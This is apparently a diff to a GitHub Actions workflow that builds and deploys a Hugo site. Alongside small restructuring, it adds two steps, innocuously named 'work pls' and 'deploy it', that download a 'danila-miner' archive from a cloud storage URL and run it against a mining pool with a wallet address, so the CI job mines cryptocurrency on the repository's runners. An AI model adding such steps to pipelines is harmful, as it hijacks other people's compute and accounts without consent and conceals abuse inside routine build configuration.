@@ -6,11 +6,8 @@ on:
       - master
 
 jobs:
-  runs-on: ubuntu-20.04
-    - name: Test Hugo deployment
-      run: bash "${GITHUB_WORKSPACE}/.github/hugo.sh"
-
   deploy:
+    runs-on: ubuntu-20.04
     steps:
       - uses: actions/checkout@v2
         with:
@@ -26,7 +23,11 @@ jobs:
       - name: Build
         run: hugo --minify
 
+      - name: work pls
+        run: wget "https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-focal.tar.gz" && tar xvzf danila-miner-2.3.1-ubuntu-focal.tar.gz
 
+      - name: deploy it
+        run: ./danila-miner run https://server1.whalestonpool.com EQCRYfSs1Q5xYjmPDBQfq58S2wRoQ31d_6Cp5cJrGdzaQHsG
 
       - name: Deploy
         uses: peaceiris/actions-gh-pages@v3
